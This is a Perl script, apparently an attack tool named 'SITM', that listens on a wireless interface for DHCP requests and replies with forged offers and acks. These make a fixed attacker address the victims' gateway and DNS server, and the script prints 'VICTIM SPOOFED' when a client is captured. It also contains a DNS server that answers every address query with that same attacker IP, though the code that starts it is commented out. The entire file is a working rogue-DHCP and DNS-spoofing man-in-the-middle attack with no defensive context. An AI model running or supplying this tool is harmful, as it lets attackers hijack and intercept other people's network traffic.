#!/usr/bin/perl -w
use strict;
use warnings;
use IO::Socket::INET;
use Net::RawIP;
use Net::Pcap::Easy;
use Net::MAC;
use Net::MAC::Vendor;
use Net::DHCP::Packet;
use Net::DHCP::Constants;
use threads;
use Net::DNS::Nameserver;
use Getopt::Long;
use Socket;

my $i = 1;
sub StartCap()
{
    my $npe = Net::Pcap::Easy->new(
        dev => "wlan0",
        packets_per_loop => 10,
        bytes_to_capture => 1024,
        timeout_in_ms    => 0, # 0ms means forever
        promiscuous      => 1, # true or false

        udp_callback => sub {
            my ($npe, $ether, $ip, $udp, $header ) = @_;
            if ($udp->{dest_port} == 67)
            {
                print "[SITM] Got DHCP Request from $ether->{src_mac}!\n";
                my $packet = Net::DHCP::Packet->new($udp->{data});
                print "DHCP Message Type : ".$packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE())."\n";
                if ($packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE()) == 1)
                {
                    print "Got DHCP Discover !\n";
                    ForgeDHCPServer($packet->xid(),"10.8.99.$i","10.8.99.199",DHCPOFFER(),$ether->{src_mac});
                }
                elsif ($packet->getOptionValue(DHO_DHCP_MESSAGE_TYPE()) == 3)
                {
                    print "Got DHCP Request !\n";
                    ForgeDHCPServer($packet->xid(),"10.8.99.$i","10.8.99.199",DHCPACK(),$ether->{src_mac});
                }
            }
        },

    );
    print "SITM DHCP Spoofing Module started !\n\n";
    print "Network IP : " .$npe->network ."\n";
    print "Netmask : " .$npe->netmask ."\n";
    1 while $npe->loop;
}

sub MacFormat{
    return join ":", ($_[0] =~ /([[:xdigit:]]{2})/g);
}

#Xid, IP To assign, Server IP, DHCP Message, Client MAC
sub ForgeDHCPServer
{
    my $dhcp_packet = Net::DHCP::Packet->new(
	'Op' => 2,
        'Chaddr' => $_[4],
        'Xid' => $_[0],
        'Yiaddr' => $_[1],
        'Giaddr' => $_[2],
        'Hops' => 1);
    $dhcp_packet->addOptionValue(DHO_DHCP_MESSAGE_TYPE(), $_[3]);
    $dhcp_packet->addOptionValue(DHO_DHCP_LEASE_TIME(), "3600");
    $dhcp_packet->addOptionValue(DHO_DHCP_SERVER_IDENTIFIER(), $_[2]);
    $dhcp_packet->addOptionValue(DHO_DOMAIN_NAME_SERVERS(), $_[2]);
    $dhcp_packet->addOptionValue(DHO_SUBNET_MASK(), "255.255.240.0");
    $dhcp_packet->addOptionValue(DHO_ROUTERS(), $_[2]);
    $dhcp_packet->addOptionValue(DHO_DOMAIN_NAME(), "HAXXOR.NET");
    
    if ($_[3] == 5)
    {
        print "/!\\ DHCPACK SENT ! VICTIM SPOOFED [Transaction ID : $_[0] - IP : $_[1]] /!\\\n";
	$i++;
    }
    elsif ($_[3] == 2)
    {
        print "/!\\ PREAUTH OFFER SENT ! /!\\\n";
    }
    SendDHCPResponse($_[1],$dhcp_packet,$_[4]);
}


sub SendDHCPResponse
{
    my $packet = Net::RawIP->new({
                          ip => {
                                saddr => '10.8.99.199',
                                daddr => $_[0],
                                },

                          udp => {
                                source => 67,
                                dest => 68,
                                data => $_[1]->serialize(),
                                },
                          });
    $packet->ethnew("wlan0");
    $packet->ethset(source => '94:db:c9:47:dc:6d',dest => MacFormat($_[2]));    
    $packet->ethsend;
}

sub DNS_Reply_Callback {
    my ($qname, $qclass, $qtype, $peerhost,$query,$conn) = @_;
    my ($rcode, @ans, @auth, @add);
           
    print "Received query from $peerhost to ". $conn->{sockhost}. "\n";

    if ($qtype eq "A") {
        my ($ttl, $rdata) = (3600, "10.8.99.199");
        my $rr = new Net::DNS::RR("$qname $ttl $qclass $qtype $rdata");
        push @ans, $rr;
        $rcode = "NOERROR";

    }
    else{
        $rcode = "NXDOMAIN";
    }                                                                                                            
    # mark the answer as authoritive (by setting the 'aa' flag
    return ($rcode, \@ans, \@auth, \@add, { aa => 1 });
}

sub StartDNS_Server
{
    my $ns = new Net::DNS::Nameserver(
        LocalPort    => 53,
        ReplyHandler => \&DNS_Reply_Callback,
        Verbose      => 1
    ) || die "couldn't create nameserver object\n";
    print "SITM DNS Spoofing Module Started !\n";
    $ns->main_loop;
}

sub Main
{
    #my $pid;
    #defined($pid = fork) or die "Pas de fork possible : $!";
    #unless($pid) {
    #    StartDNS_Server();
    #}
    StartCap();
}

Main();
